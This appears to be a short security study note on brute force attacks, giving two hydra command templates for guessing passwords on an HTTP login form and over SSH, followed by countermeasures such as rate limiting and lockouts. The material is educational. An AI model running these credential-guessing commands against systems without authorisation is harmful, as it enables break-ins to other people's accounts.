# Brute force attacks

**Brute force attacks** are attacks where a vast amount of options are tested in
order to find credentials or similar. This is an attempt of breaching
Confidentiality in the [CIA triad](../threat_modelling.md#cia).

## Examples with hydra

One common tool for performing brute force attacks is `hydra`. Here are some
examples of password brute force attacks can be accomplished.

### HTTP form data

```sh
hydra -l <username> -P <list-list> <ip> http-post-form "/rest/user/login:email=^USER^&password=^PASSWORD^:F=Invalid"
```

### SSH

```sh
hydra -l <username> -P <password-list> ssh://<ip>
```

## Countermeasures

The best approach for countering brute force attacks is to

- rate limiting
- exponential back off for failed attempts
- blacklisting after a given amounts of incorrect attempts. Should be a large
  number to not impact regular users.
